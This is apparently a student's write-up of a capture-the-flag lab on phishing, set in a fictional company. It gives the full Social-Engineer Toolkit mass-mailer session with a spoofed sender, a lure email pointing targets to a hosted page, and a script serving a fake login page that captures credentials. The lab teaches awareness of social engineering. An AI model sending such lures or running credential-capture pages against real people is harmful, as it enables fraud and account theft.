# Phishing Exercise for TBFC

**Category:Social engineering(scamming is it)**  

---

## Description:
### Phishing
 > hishing is a subset of social engineering in which the communication medium is mostly messages.<br>
 At one point, the most common phishing attacks happened via email; however, the spread of smartphones,<Br>
 along with ubiquitous Internet access, has spread phishing to short text messages (smishing), voice calls (vishing),<Br>
 QR codes (quishing), and social-media direct messages. The attacker’s purpose is to make the target user click, open, or reply<br>
 to a message so that the attacker can steal information, money, or access.

---

## 💥 Vulnerability

- What is controllable? The human brain, hence social engineering
- Why is it dangerous? Humans be human-ing


---

## What are going to learn
1. Creating phishing trap
 > In this task, we aim to acquire the target user’s login credentials. Our trap would be a fake TBFC portal login page,<br>
 which we attach to the phishing email and send to the target. But a login page itself is not enough. We need to host it and <BR>
 implement some logic to capture the credentials entered by the target. To facilitate your task, we have already set up a script that,<br>
 when run, will host a fake login page. The phoney login page we created will capture all the credentials entered into the page.
2. Learning how to use Social-engineer TOOLKIT (SET)
3. For our ease the script is placed at 
```bash
~/Rooms/AoC2025/Day02
```
---

## Settinig up the trap
1. Opening SET in terminal
 1. Selecting our specific attack 
    2. mass-mailer attack > single email address > factory@wareville.com > user your own server or open relay
```bash
set:phishing> From address (ex: moo@example.com):updates@deershipping.thm
set:phishing> The FROM NAME the user will see:Deer Shipping
set:phishing> Username for open-relay [blank]:
Password for open-relay [blank]: 
set:phishing> SMTP email server address (ex. smtp.youremailserveryouown.com):MACHINE_IP
set:phishing> Port number for the SMTP server [25]:  
set:phishing> Flag this message/s as high priority? [yes|no]:no
Do you want to attach a file - [y/n]: n
Do you want to attach an inline file - [y/n]: n
set:phishing> Email subject:Shipping Schedule Changes
set:phishing> Send the message as HTML or plain? 'h' or 'p' [p]:
[!] IMPORTANT: When finished, type END (all capital) then hit {return} on a new line.
set:phishing> Enter the body of the message, type END (capitals) when finished:Dear elves, 
Next line of the body: Kindly note that there have been significant changes to the shipping schedules due to increased shipping orders.
Next line of the body: Please confirm the new schedule by visiting http://CONNECTION_IP:8000
Next line of the body: Best regards,
Next line of the body: Flying Deer
Next line of the body: END
[*] SET has finished sending the emails
```
 2. Now we need to initiate the server.py script and go to our hosted Pentesting site.

## Conclusion
> We receive the login credentials <br>
### 
```
The total number of toys expected for delivery is 1984000
```
